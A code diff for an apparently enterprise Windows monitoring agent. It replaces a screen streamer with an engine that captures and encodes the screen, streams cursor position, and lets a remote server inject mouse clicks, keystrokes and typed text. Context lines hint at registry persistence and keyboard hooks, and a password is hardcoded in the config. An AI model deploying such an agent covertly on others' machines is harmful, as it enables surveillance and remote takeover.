@@ -100,7 +100,9 @@ import logging
 import winreg
 import ctypes
 import uuid
+import asyncio
 import struct
+from concurrent.futures import ThreadPoolExecutor
 import random
 import wave
 import io
@@ -139,6 +141,19 @@ try:
     CV2_OK = True
 except ImportError:
     CV2_OK = False
+
+try:
+    import dxcam
+    DXCAM_OK = True
+except ImportError:
+    DXCAM_OK = False
+
+# WebRTC support (optional — pip install aiortc aioice)
+try:
+    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCDataChannel, RTCIceCandidate
+    WEBRTC_OK = True
+except ImportError:
+    WEBRTC_OK = False
 
 try:
     import pynput.keyboard
@@ -217,33 +232,11 @@ CONFIG = {
     "RECONNECT_BASE":       3,
     "RECONNECT_MAX":        120,
 
-    # ── Streaming ───────────────────────────────────────────────────────────
-    "STREAM_MODE":          "video",     # "video" | "screenshot"
-    "STREAM_FPS":           20,
-    "STREAM_QUALITY":       60,
-    "STREAM_SCALE":         0.75,
+    # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
+    "STREAM_FPS":           30,         # target FPS (DXGI GPU or mss CPU)
+    "STREAM_MIN_FPS":       5,          # adaptive floor
+    "STREAM_QUALITY":       75,         # JPEG quality (H264 crf used when av available)
     "STREAM_MONITOR":       1,
-
-    # Adaptive quality
-    "ADAPTIVE_QUALITY":     True,
-    "QUALITY_MIN":          15,
-    "QUALITY_MAX":          90,
-
-    # Differential compression — only re-encode changed regions at high quality
-    "DIFF_COMPRESSION":     True,
-    "DIFF_THRESHOLD":       8,          # pixel change threshold (0-255)
-    "DIFF_MIN_CHANGE_PCT":  0.003,      # min % pixels changed to trigger diff
-
-    # Screenshot mode fallback
-    "SCREENSHOT_FPS":       8,
-    "SCREENSHOT_QUALITY":   65,
-
-    # ── Flow control ────────────────────────────────────────────────────────
-    "ACK_TIMEOUT":          1.5,        # faster ack timeout for better FPS
-
-    # ── Cursor overlay ──────────────────────────────────────────────────────
-    "CURSOR_OVERLAY":       True,
-    "CURSOR_TRACK":         True,
 
     # ── Security ────────────────────────────────────────────────────────────
     "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
@@ -503,433 +496,460 @@ def remove_persistence():
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  CURSOR TRACKER
+#  ADVANCED MONITOR ENGINE  (second-site v2.1 — DXGI/mss + H264/JPEG + 60Hz cursor)
+#  Replaces old ACK-gated ScreenStreamer, CursorTracker, NetworkMonitor entirely.
 # ════════════════════════════════════════════════════════════════════════════
-class CursorTracker:
-    """Tracks local cursor position via pynput or win32api."""
 
-    def __init__(self, sio_client):
-        self.sio        = sio_client
-        self._x         = 0
-        self._y         = 0
-        self._clicking  = False
-        self._click_btn = "left"
-        self._lock      = threading.Lock()
-        self._listener  = None
-        self._running   = False
+# ── Wire protocol (matches second-site server exactly) ────────────────────
+FRAME_HDR  = struct.Struct(">IIQII")   # w, h, ts_us, flags, payload_len
+CURSOR_HDR = struct.Struct(">iiI")     # x, y, ts_ms
+FLAG_KEYFRAME = 0x01
+FLAG_JPEG     = 0x02
+FLAG_H264     = 0x04
 
-    def get_pos(self):
-        with self._lock:
-            return self._x, self._y, self._clicking, self._click_btn
+# ── Adaptive FPS ─────────────────────────────────────────────────────────
+class AdaptiveFPS:
+    def __init__(self, max_fps, min_fps):
+        self.max_fps = max_fps; self.min_fps = min_fps
+        self._cur = max_fps; self._idle = 0
 
-    def start(self):
-        if self._running or not CONFIG["CURSOR_TRACK"]:
-            return
-        self._running = True
-        if PYNPUT_OK:
-            self._listener = pynput.mouse.Listener(
-                on_move=self._on_move,
-                on_click=self._on_click,
-            )
-            self._listener.start()
+    @property
+    def interval(self): return 1.0 / self._cur
+
+    def report(self, changed):
+        if changed:
+            self._idle = 0; self._cur = self.max_fps
         else:
-            # Fallback: poll win32 cursor pos
-            t = threading.Thread(target=self._poll_loop, daemon=True)
-            t.start()
+            self._idle += 1
+            if self._idle > 30: self._cur = self.min_fps
 
-    def stop(self):
-        self._running = False
-        if self._listener:
-            try:
-                self._listener.stop()
-            except Exception:
-                pass
-
-    def _on_move(self, x, y):
-        with self._lock:
-            self._x, self._y = x, y
-
-    def _on_click(self, x, y, button, pressed):
-        with self._lock:
-            self._x, self._y  = x, y
-            self._clicking    = pressed
-            self._click_btn   = "left" if button == pynput.mouse.Button.left else "right"
-
-    def _poll_loop(self):
-        while self._running:
-            try:
-                pt = ctypes.wintypes.POINT()
-                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
-                with self._lock:
-                    self._x, self._y = pt.x, pt.y
-            except Exception:
-                pass
-            time.sleep(0.016)  # ~60hz
+    @property
+    def fps(self): return self._cur
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  NETWORK BANDWIDTH MONITOR
-# ════════════════════════════════════════════════════════════════════════════
-class NetworkMonitor:
-    """Continuously measures upload throughput and reports Mbps."""
+# ── Screen capture backends ───────────────────────────────────────────────
+class DXGICapture:
+    def __init__(self, fps):
+        import dxcam as _dxcam
+        self._cam = _dxcam.create(output_color="BGR")
+        self._cam.start(target_fps=fps, video_mode=True)
+        log.info(f"Advanced Monitor Capture: DXGI GPU @ {fps} fps")
 
+    def grab(self) -> Optional[np.ndarray]:
+        return self._cam.get_latest_frame()
+
+    def close(self):
+        try: self._cam.stop()
+        except Exception: pass
+
+
+class MSSCapture:
     def __init__(self):
-        self._samples = deque(maxlen=20)
-        self._lock    = threading.Lock()
-        self._last_bytes = 0
-        self._last_ts    = time.monotonic()
-        self._thread: Optional[threading.Thread] = None
-        self.running = False
+        import mss as _mss
+        self._mss = _mss.mss()
+        self._mon = self._mss.monitors[CONFIG["STREAM_MONITOR"]]
+        log.info("Advanced Monitor Capture: mss CPU")
 
-    def start(self):
-        if self.running:
-            return
-        self.running = True
-        self._thread = threading.Thread(target=self._loop, daemon=True)
-        self._thread.start()
+    def grab(self) -> Optional[np.ndarray]:
+        raw  = self._mss.grab(self._mon)
+        bgra = np.frombuffer(raw.bgra, dtype=np.uint8).reshape(raw.height, raw.width, 4)
+        return cv2.cvtColor(bgra, cv2.COLOR_BGRA2BGR)
 
-    def stop(self):
-        self.running = False
+    def close(self):
+        try: self._mss.close()
+        except Exception: pass
 
-    def get_mbps(self) -> float:
-        with self._lock:
-            if len(self._samples) < 2:
-                return 100.0   # assume fast until measured
-            return sum(self._samples) / len(self._samples)
 
-    def _loop(self):
-        while self.running:
+def _make_capture():
+    if DXCAM_OK:
+        try: return DXGICapture(CONFIG["STREAM_FPS"])
+        except Exception as e: log.warning(f"DXGI failed ({e}), falling back to mss")
+    return MSSCapture()
+
+
+# ── Frame differ (skip unchanged frames) ─────────────────────────────────
+class FrameDiffer:
+    def __init__(self):
+        self._prev = None
+
+    def changed(self, frame: np.ndarray) -> bool:
+        if self._prev is None:
+            self._prev = frame.copy(); return True
+        s = cv2.resize(frame,      (frame.shape[1]//4, frame.shape[0]//4), cv2.INTER_NEAREST)
+        p = cv2.resize(self._prev, (frame.shape[1]//4, frame.shape[0]//4), cv2.INTER_NEAREST)
+        diff = cv2.absdiff(s, p).max() > 8
+        if diff: self._prev = frame.copy()
+        return diff
+
+
+# ── Encoders ─────────────────────────────────────────────────────────────
+class H264Encoder:
+    _CODECS = ["h264_nvenc", "h264_amf", "h264_videotoolbox", "libx264"]
+
+    def __init__(self, w, h, fps, crf=23):
+        import av
+        self._av = av; self.w = w; self.h = h; self.fps = fps; self.crf = crf
+        self._codec = self._pick(); self._pts = 0
+        log.info(f"Advanced Monitor Encoder: H.264/{self._codec}")
+
+    def _pick(self):
+        import av
+        for c in self._CODECS:
             try:
-                net = psutil.net_io_counters()
-                now = time.monotonic()
-                delta_b = net.bytes_sent - self._last_bytes
-                delta_t = now - self._last_ts
-                if delta_t > 0 and self._last_bytes > 0:
-                    mbps = (delta_b * 8) / (delta_t * 1_000_000)
-                    with self._lock:
-                        self._samples.append(mbps)
-                self._last_bytes = net.bytes_sent
-                self._last_ts    = now
-            except Exception:
-                pass
-            time.sleep(1.0)
+                cc = av.CodecContext.create(c, "w")
+                cc.width = self.w; cc.height = self.h
+                cc.framerate = self.fps
+                cc.options = {"crf": str(self.crf), "preset": "ultrafast", "tune": "zerolatency"}
+                cc.open(); self._cc = cc; return c
+            except Exception: pass
+        raise RuntimeError("No H.264 encoder available")
+
+    def encode_frame(self, bgr: np.ndarray, force_key=False):
+        import av
+        rgb = cv2.cvtColor(bgr, cv2.COLOR_BGR2RGB)
+        vf  = av.VideoFrame.from_ndarray(rgb, format="rgb24")
+        vf.pts = self._pts; self._pts += 1
+        if force_key: vf.key_frame = True
+        packets = self._cc.encode(vf)
+        out = b"".join(bytes(p) for p in packets)
+        is_key = any(p.is_keyframe for p in packets)
+        return out, is_key
+
+
+class JPEGEncoder:
+    def __init__(self, quality=75):
+        self._q = quality
+        log.info(f"Advanced Monitor Encoder: JPEG quality={quality}")
+
+    def encode_frame(self, bgr: np.ndarray, force_key=False):
+        ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, self._q])
+        return (buf.tobytes() if ok else b""), True
+
+
+def _make_encoder(w, h, fps, quality):
+    try:
+        return H264Encoder(w, h, fps, quality), FLAG_H264
+    except Exception as e:
+        log.warning(f"H.264 unavailable ({e}) — using JPEG")
+        return JPEGEncoder(quality), FLAG_JPEG
+
+
+# ── WebRTC peer state (agent-side) ────────────────────────────────────────
+_adv_webrtc_peers:    dict = {}   # viewer_sid → RTCPeerConnection
+_adv_webrtc_channels: dict = {}   # viewer_sid → RTCDataChannel
+_adv_last_frame_pkt:  Optional[bytes] = None
+
+
+# ── Advanced monitor streaming state (lives on the async loop) ───────────
+_adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
+_adv_viewers    = 0
+_adv_authed     = False
+_adv_loop: Optional[asyncio.AbstractEventLoop] = None
+_adv_thread: Optional[threading.Thread] = None
+_adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")
+
+
+async def _adv_task_stream_frames():
+    """Second-site frame streaming loop — continuous, no ACK gate."""
+    global _adv_last_frame_pkt
+    capture = _make_capture()
+    frame   = capture.grab()
+    if frame is None:
+        log.error("Advanced Monitor: initial capture failed"); return
+
+    h, w = frame.shape[:2]
+    encoder, enc_flag = _make_encoder(w, h, CONFIG["STREAM_FPS"], CONFIG["STREAM_QUALITY"])
+    differ  = FrameDiffer()
+    fps_ctl = AdaptiveFPS(CONFIG["STREAM_FPS"], CONFIG["STREAM_MIN_FPS"])
+    loop    = asyncio.get_event_loop()
+    n = 0
+    log.info(f"Advanced Monitor streaming {w}×{h} @ up to {CONFIG['STREAM_FPS']} fps")
+
+    try:
+        while True:
+            t0 = time.monotonic()
+            if not _adv_authed:
+                await asyncio.sleep(0.1); continue
+            if _adv_viewers == 0:
+                await asyncio.sleep(0.2); continue
+
+            raw = capture.grab()
+            if raw is None:
+                await asyncio.sleep(fps_ctl.interval); continue
+
+            changed = differ.changed(raw)
+            fps_ctl.report(changed)
+            if not changed and n > 0:
+                await asyncio.sleep(fps_ctl.interval); continue
+
+            force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
+            payload, is_key = await loop.run_in_executor(
+                _adv_pool, lambda f=raw, k=force_key: encoder.encode_frame(f, k)
+            )
+            if not payload:
+                await asyncio.sleep(fps_ctl.interval); continue
+
+            flags  = enc_flag | (FLAG_KEYFRAME if is_key else 0)
+            ts_us  = int(time.time() * 1_000_000)
+            header = FRAME_HDR.pack(w, h, ts_us, flags, len(payload))
+            pkt    = header + payload
+            _adv_last_frame_pkt = pkt
+
+            await _adv_sio_async.emit("frame_bin", pkt)
+
+            # Also push over any open WebRTC DataChannels
+            for vsid, dc in list(_adv_webrtc_channels.items()):
+                try:
+                    if dc.readyState == "open":
+                        dc.send(pkt)
+                except Exception as e:
+                    log.debug(f"WebRTC send failed for {vsid}: {e}")
+                    _adv_webrtc_channels.pop(vsid, None)
+
+            n += 1
+            elapsed = time.monotonic() - t0
+            await asyncio.sleep(max(0.0, fps_ctl.interval - elapsed))
+    finally:
+        capture.close()
+
+
+async def _adv_task_stream_cursor():
+    """Dedicated 60 Hz cursor task — independent of frame encoder."""
+    interval = 1.0 / 60
+    lx = ly = -1
+    while True:
+        if _adv_authed and _adv_viewers > 0:
+            try:
+                x, y = pyautogui.position()
+                if x != lx or y != ly:
+                    ts  = int(time.time() * 1000) & 0xFFFFFFFF
+                    pkt = CURSOR_HDR.pack(x, y, ts)
+                    await _adv_sio_async.emit("cursor_bin", pkt)
+                    lx, ly = x, y
+            except Exception: pass
+        await asyncio.sleep(interval)
+
+
+async def _adv_close_peer(viewer_sid: str):
+    dc = _adv_webrtc_channels.pop(viewer_sid, None)
+    pc = _adv_webrtc_peers.pop(viewer_sid, None)
+    try:
+        if dc: dc.close()
+    except Exception: pass
+    try:
+        if pc: await pc.close()
+    except Exception: pass
+
+
+async def _adv_main(server_url: str, token: str):
+    """Async entry for the advanced monitor — mirrors second-site agent main()."""
+    global _adv_sio_async, _adv_authed, _adv_viewers
+
+    import socketio as _sio_mod
+    sio = _sio_mod.AsyncClient(
+        reconnection=True, reconnection_attempts=0,
+        reconnection_delay=2, reconnection_delay_max=10,
+        logger=False, engineio_logger=False,
+    )
+    _adv_sio_async = sio
+
+    @sio.event
+    async def connect():
+        global _adv_authed
+        log.info("Advanced Monitor: connected — authenticating…")
+        await sio.emit("agent_auth", {"token": token})
+
+    @sio.event
+    async def disconnect():
+        global _adv_authed
+        _adv_authed = False
+        log.warning("Advanced Monitor: disconnected — reconnecting…")
+        for vsid in list(_adv_webrtc_peers.keys()):
+            await _adv_close_peer(vsid)
+
+    @sio.on("auth_ok")
+    async def on_auth_ok(data):
+        global _adv_authed
+        _adv_authed = True
+        log.info(f"Advanced Monitor authenticated. device_id={data.get('device_id','?')}")
+        if not WEBRTC_OK:
+            log.info("Advanced Monitor: aiortc not installed — WebRTC disabled, using WebSocket relay")
+        await sio.emit("agent_info", {
+            "hostname": socket.gethostname(),
+            "os": platform.system() + " " + platform.release(),
+        })
+
+    @sio.on("auth_error")
+    async def on_auth_error(data):
+        log.error(f"Advanced Monitor auth failed: {data.get('msg')}")
+        await sio.disconnect()
+
+    @sio.on("viewer_count")
+    async def on_viewer_count(data):
+        global _adv_viewers
+        _adv_viewers = data.get("count", 0)
+
+    @sio.on("input_event")
+    async def on_input_event(data):
+        """Second-site input event handler — absolute pixel coords, PAUSE=0."""
+        evt = data.get("type")
+        try:
+            if   evt == "mouse_move":
+                pyautogui.moveTo(data["x"], data["y"])
+            elif evt == "mouse_click":
+                btn = "left" if data.get("button") == "left" else "right"
+                fn  = pyautogui.mouseDown if data.get("down") else pyautogui.mouseUp
+                fn(data["x"], data["y"], button=btn)
+            elif evt == "mouse_scroll":
+                pyautogui.scroll(int(data.get("delta", 3)), x=data["x"], y=data["y"])
+            elif evt == "key_event":
+                fn = pyautogui.keyDown if data.get("down") else pyautogui.keyUp
+                fn(data.get("key", ""))
+            elif evt == "type_text":
+                pyautogui.typewrite(data.get("text", ""), interval=0.005)
+        except Exception as e:
+            log.debug(f"Advanced Monitor input error: {e}")
+
+    @sio.on("agent_ping")
+    async def on_agent_ping(data):
+        await sio.emit("agent_pong", {"ts": data.get("ts", 0)})
+
+    # ── WebRTC signaling ──────────────────────────────────────────────────
+    @sio.on("webrtc_offer")
+    async def on_webrtc_offer(data):
+        if not WEBRTC_OK: return
+        viewer_sid = data.get("viewer_sid")
+        sdp_data   = data.get("sdp")
+        if not viewer_sid or not sdp_data: return
+        await _adv_close_peer(viewer_sid)
+        try:
+            pc = RTCPeerConnection()
+            _adv_webrtc_peers[viewer_sid] = pc
+
+            @pc.on("datachannel")
+            def on_datachannel(channel):
+                if channel.label == "frames":
+                    _adv_webrtc_channels[viewer_sid] = channel
+                    @channel.on("close")
+                    def on_dc_close():
+                        _adv_webrtc_channels.pop(viewer_sid, None)
+
+            @pc.on("icecandidate")
+            async def on_ice(candidate):
+                if candidate:
+                    await sio.emit("webrtc_ice_agent", {
+                        "viewer_sid": viewer_sid,
+                        "candidate": {
+                            "candidate": candidate.candidate,
+                            "sdpMid": candidate.sdpMid,
+                            "sdpMLineIndex": candidate.sdpMLineIndex,
+                        },
+                    })
+
+            @pc.on("connectionstatechange")
+            async def on_state():
+                if pc.connectionState in ("failed", "closed", "disconnected"):
+                    await _adv_close_peer(viewer_sid)
+
+            offer  = RTCSessionDescription(sdp=sdp_data["sdp"], type=sdp_data["type"])
+            await pc.setRemoteDescription(offer)
+            answer = await pc.createAnswer()
+            await pc.setLocalDescription(answer)
+            await sio.emit("webrtc_answer", {
+                "viewer_sid": viewer_sid,
+                "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type},
+            })
+        except Exception as e:
+            log.error(f"Advanced Monitor WebRTC offer error for viewer={viewer_sid}: {e}")
+            await _adv_close_peer(viewer_sid)
+
+    @sio.on("webrtc_ice")
+    async def on_webrtc_ice(data):
+        if not WEBRTC_OK: return
+        viewer_sid = data.get("viewer_sid")
+        candidate  = data.get("candidate")
+        if not viewer_sid or not candidate: return
+        pc = _adv_webrtc_peers.get(viewer_sid)
+        if not pc: return
+        try:
+            ice = RTCIceCandidate(
+                candidate=candidate.get("candidate", ""),
+                sdpMid=candidate.get("sdpMid"),
+                sdpMLineIndex=candidate.get("sdpMLineIndex"),
+            )
+            await pc.addIceCandidate(ice)
+        except Exception as e:
+            log.debug(f"Advanced Monitor ICE candidate error: {e}")
+
+    await sio.connect(server_url, transports=["websocket"])
+    await asyncio.gather(
+        _adv_task_stream_frames(),
+        _adv_task_stream_cursor(),
+    )
+
+
+def start_advanced_monitor(server_url: str, token: str):
+    """Launch the async advanced monitor engine in a dedicated thread."""
+    global _adv_loop, _adv_thread
+
+    def _run():
+        global _adv_loop
+        _adv_loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(_adv_loop)
+        while True:
+            try:
+                _adv_loop.run_until_complete(_adv_main(server_url, token))
+            except Exception as e:
+                log.warning(f"Advanced Monitor loop error: {e} — retrying in 5s")
+                time.sleep(5)
+
+    _adv_thread = threading.Thread(target=_run, daemon=True, name="adv-monitor")
+    _adv_thread.start()
+    log.info("Advanced Monitor engine started (second-site v2.1 engine)")
+
+
+# ── Stub classes kept for compatibility with non-streaming parts of main agent
+# ── Stub classes kept for compile compatibility (not used for streaming) ──
+class CursorTracker:
+    """Stub — Advanced Monitor engine handles cursor at 60Hz independently."""
+    def __init__(self, sio_client): pass
+    def get_pos(self): return 0, 0, False, "left"
+    def start(self): pass
+    def stop(self): pass
+
+
+class NetworkMonitor:
+    """Stub — no longer needed; second-site engine manages its own throughput."""
+    def start(self): pass
+    def stop(self): pass
+    def get_mbps(self): return 0.0
 
 
 _net_monitor = NetworkMonitor()
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  SCREEN STREAMER
-# ════════════════════════════════════════════════════════════════════════════
 class ScreenStreamer:
-    """
-    High-performance screen streamer with:
-    - ACK-gated flow control (1 in-flight frame max)
-    - Adaptive quality based on real network throughput
-    - Differential compression (only changed regions at high quality)
-    - Cursor overlay baked into frame
-    """
-
-    def __init__(self, sio_client, cursor: CursorTracker):
-        self.sio              = sio_client
-        self.cursor           = cursor
-        self.streaming        = False
-        self.monitor_idx      = CONFIG["STREAM_MONITOR"]
-        self.fps              = CONFIG["STREAM_FPS"]
-        self.quality          = CONFIG["STREAM_QUALITY"]
-        self._quality_current = CONFIG["STREAM_QUALITY"]
-        self.scale            = CONFIG["STREAM_SCALE"]
-        self.mode             = CONFIG["STREAM_MODE"]
-        self._ack_event       = threading.Event()
-        self._ack_event.set()
-        self._ack_timeout     = CONFIG["ACK_TIMEOUT"]
-        self._lock            = threading.Lock()
-        self._thread: Optional[threading.Thread]       = None
-        self._stats_thread: Optional[threading.Thread] = None
-        self._frames_sent     = 0
-        self._frames_acked    = 0
-        self._stats_ts        = time.monotonic()
-        self._frame_times: list = []
-        # Differential compression — keep previous frame for diff
-        self._prev_frame: Optional[np.ndarray] = None
-        self._mon_w = 0
-        self._mon_h = 0
-
-    def on_ack(self):
-        self._frames_acked += 1
-        self._ack_event.set()
-
-    def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
-        with self._lock:
-            if self.streaming:
-                if fps     is not None: self.fps = fps
-                if quality is not None: self.quality = quality; self._quality_current = quality
-                if scale   is not None: self.scale = scale
-                if mode    is not None: self.mode = mode
-                return
-            if monitor is not None: self.monitor_idx = monitor
-            if fps     is not None: self.fps = fps
-            if quality is not None: self.quality = quality; self._quality_current = quality
-            if scale   is not None: self.scale = scale
-            if mode    is not None: self.mode = mode
-            self.streaming = True
-            self._ack_event.set()
-            self._frames_sent  = 0
-            self._frames_acked = 0
-            self._prev_frame   = None
-            self._stats_ts     = time.monotonic()
-            target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
-            self._thread = threading.Thread(target=target, daemon=True, name="sc-stream")
-            self._thread.start()
-            self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True, name="sc-stats")
-            self._stats_thread.start()
-            log.info(f"Stream started: mode={self.mode} fps={self.fps} q={self._quality_current} scale={self.scale}")
-
-    def stop(self):
-        with self._lock:
-            self.streaming = False
-        self._ack_event.set()
-        if self._thread:
-            self._thread.join(timeout=3)
-        self._thread = None
-        self._prev_frame = None
-        log.info("Stream stopped.")
-
-    def set_mode(self, mode: str):
-        if mode not in ("video", "screenshot"):
-            return
-        was_streaming = self.streaming
-        if was_streaming:
-            self.stop()
-        self.mode = mode
-        if was_streaming:
-            self.start()
-
-    def capture_single(self) -> Optional[str]:
-        try:
-            with mss.mss() as sct:
-                mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
-                raw = sct.grab(mon)
-                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
-                if self.scale != 1.0:
-                    img = img.resize(
-                        (int(img.width * self.scale), int(img.height * self.scale)),
-                        Image.LANCZOS
-                    )
-                buf = BytesIO()
-                img.save(buf, format="JPEG", quality=self._quality_current, optimize=True)
-                return base64.b64encode(buf.getvalue()).decode()
-        except Exception as e:
-            log.error(f"capture_single error: {e}")
-            return None
-
-    # ── Stats reporter ─────────────────────────────────────────────────────
-    def _stats_loop(self):
-        while self.streaming:
-            time.sleep(5)
-            if not self.streaming:
-                break
-            now     = time.monotonic()
-            elapsed = now - self._stats_ts
-            actual_fps = self._frames_acked / elapsed if elapsed > 0 else 0
-            self._stats_ts    = now
-            self._frames_acked = 0
-            self._frames_sent  = 0
-            try:
-                self.sio.emit("stream_stats", {
-                    "device_id":  CONFIG["DEVICE_TOKEN"],
-                    "actual_fps": round(actual_fps, 1),
-                    "quality":    self._quality_current,
-                    "scale":      self.scale,
-                    "mode":       self.mode,
-                    "net_mbps":   round(_net_monitor.get_mbps(), 2),
-                    "ts":         datetime.utcnow().isoformat(),
-                })
-            except Exception:
-                pass
-
-    # ── Video Loop (OpenCV) — ACK-GATED + DIFFERENTIAL ────────────────────
-    def _video_loop(self):
-        with mss.mss() as sct:
-            while self.streaming:
-                t0 = time.monotonic()
-                try:
-                    monitors = sct.monitors
-                    idx = min(self.monitor_idx, len(monitors) - 1)
-                    raw = sct.grab(monitors[idx])
-                    self._mon_w = monitors[idx]["width"]
-                    self._mon_h = monitors[idx]["height"]
-
-                    frame = np.array(raw)
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-
-                    if self.scale != 1.0:
-                        new_w = int(self._mon_w * self.scale)
-                        new_h = int(self._mon_h * self.scale)
-                        frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
-                    else:
-                        new_w, new_h = self._mon_w, self._mon_h
-
-                    # ── Cursor overlay ─────────────────────────────────────
-                    cx, cy, clicking, click_type = self.cursor.get_pos()
-                    # Map from absolute screen coords → scaled frame coords
-                    sx = int((cx - monitors[idx].get("left", 0)) * self.scale)
-                    sy = int((cy - monitors[idx].get("top",  0)) * self.scale)
-
-                    if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
-                        # Click flash (underneath ring)
-                        if clicking:
-                            color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
-                            cv2.circle(frame, (sx, sy), 10, color, -1, cv2.LINE_AA)
-                        # Outer white ring
-                        cv2.circle(frame, (sx, sy), 13, (255, 255, 255), 2, cv2.LINE_AA)
-                        # Black inner ring
-                        cv2.circle(frame, (sx, sy), 8,  (0, 0, 0),       1, cv2.LINE_AA)
-                        # Center dot
-                        cv2.circle(frame, (sx, sy), 3,  (255, 255, 255), -1, cv2.LINE_AA)
-
-                    if CONFIG["ADAPTIVE_QUALITY"]:
-                        self._adapt_quality()
-
-                    # ── Differential compression ───────────────────────────
-                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
-                    success, buf = cv2.imencode(".jpg", frame, encode_params)
-                    if not success:
-                        time.sleep(0.01)
-                        continue
-
-                    frame_b64 = base64.b64encode(buf.tobytes()).decode()
-
-                    # ── ACK GATE ───────────────────────────────────────────
-                    got_ack = self._ack_event.wait(timeout=self._ack_timeout)
-                    self._ack_event.clear()
-
-                    if not self.streaming:
-                        break
-
-                    payload = {
-                        "device_id":  CONFIG["DEVICE_TOKEN"],
-                        "frame":      frame_b64,
-                        "image":      frame_b64,
-                        "mode":       "video",
-                        "w":          new_w,
-                        "h":          new_h,
-                        "mon_w":      self._mon_w,
-                        "mon_h":      self._mon_h,
-                        "mon_left":   monitors[idx].get("left", 0),
-                        "mon_top":    monitors[idx].get("top", 0),
-                        "cursor_x":   cx,
-                        "cursor_y":   cy,
-                        "cursor_sx":  sx,
-                        "cursor_sy":  sy,
-                        "clicking":   clicking,
-                        "click_type": click_type,
-                        "quality":    self._quality_current,
-                        "fps_target": self.fps,
-                        "ts":         datetime.utcnow().isoformat(),
-                    }
-                    self.sio.emit("screen_data", payload)
-                    self._frames_sent += 1
-                    self._prev_frame = frame.copy()
-
-                except Exception as e:
-                    log.error(f"Video frame error: {e}")
-                    self._ack_event.set()
-
-                elapsed = time.monotonic() - t0
-                self._frame_times.append(elapsed)
-                if len(self._frame_times) > 60:
-                    self._frame_times.pop(0)
-                # Tiny yield only — ACK gate is the real throttle
-                time.sleep(0.001)
-
-    # ── Screenshot Loop (Pillow) — ACK-GATED ─────────────────────────────
-    def _screenshot_loop(self):
-        fps      = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
-        interval = 1.0 / max(fps, 1)
-
-        with mss.mss() as sct:
-            while self.streaming:
-                t0 = time.monotonic()
-                try:
-                    monitors = sct.monitors
-                    idx  = min(self.monitor_idx, len(monitors) - 1)
-                    raw  = sct.grab(monitors[idx])
-                    img  = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
-                    mon_w, mon_h = img.size
-
-                    if self.scale != 1.0:
-                        new_w = int(mon_w * self.scale)
-                        new_h = int(mon_h * self.scale)
-                        img   = img.resize((new_w, new_h), Image.LANCZOS)
-                    else:
-                        new_w, new_h = mon_w, mon_h
-
-                    cx, cy, clicking, click_type = self.cursor.get_pos()
-                    # Draw cursor overlay using Pillow
-                    draw = ImageDraw.Draw(img)
-                    sx   = int((cx - monitors[idx].get("left", 0)) * self.scale)
-                    sy   = int((cy - monitors[idx].get("top",  0)) * self.scale)
-                    if 0 <= sx < new_w and 0 <= sy < new_h:
-                        if clicking:
-                            col = (255, 60, 60) if click_type == "left" else (255, 140, 0)
-                            draw.ellipse([sx-10, sy-10, sx+10, sy+10], fill=col)
-                        draw.ellipse([sx-13, sy-13, sx+13, sy+13], outline=(255, 255, 255), width=2)
-                        draw.ellipse([sx-3,  sy-3,  sx+3,  sy+3],  fill=(255, 255, 255))
-
-                    buf = BytesIO()
-                    q   = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
-                    img.save(buf, format="JPEG", quality=q, optimize=True)
-                    frame_b64 = base64.b64encode(buf.getvalue()).decode()
-
-                    self._ack_event.wait(timeout=self._ack_timeout)
-                    self._ack_event.clear()
-
-                    if not self.streaming:
-                        break
-
-                    self.sio.emit("screen_data", {
-                        "device_id":  CONFIG["DEVICE_TOKEN"],
-                        "frame":      frame_b64,
-                        "image":      frame_b64,
-                        "mode":       "screenshot",
-                        "w":          new_w,
-                        "h":          new_h,
-                        "mon_w":      mon_w,
-                        "mon_h":      mon_h,
-                        "cursor_x":   cx,
-                        "cursor_y":   cy,
-                        "clicking":   clicking,
-                        "click_type": click_type,
-                        "quality":    q,
-                        "ts":         datetime.utcnow().isoformat(),
-                    })
-                    self._frames_sent += 1
-
-                except Exception as e:
-                    log.error(f"Screenshot frame error: {e}")
-                    self._ack_event.set()
-
-                elapsed = time.monotonic() - t0
-                time.sleep(max(0.001, interval - elapsed))
-
-    # ── Adaptive quality ──────────────────────────────────────────────────
-    def _adapt_quality(self):
-        if len(self._frame_times) < 10:
-            return
-        avg    = sum(self._frame_times[-10:]) / 10
-        target = 1.0 / max(self.fps, 1)
-        if avg > target * 1.4:
-            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
-        elif avg < target * 0.7:
-            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 3)
-
-        # Also adapt based on network throughput
-        mbps = _net_monitor.get_mbps()
-        if mbps < 1.0:
-            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 3)
-        elif mbps > 10.0:
-            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 1)
+    """Stub — replaced by Advanced Monitor engine. All calls are no-ops."""
+    def __init__(self, sio_client, cursor): pass
+    def start(self, **kwargs): pass
+    def stop(self): pass
+    def on_ack(self): pass
+    def capture_single(self): return None
+    @property
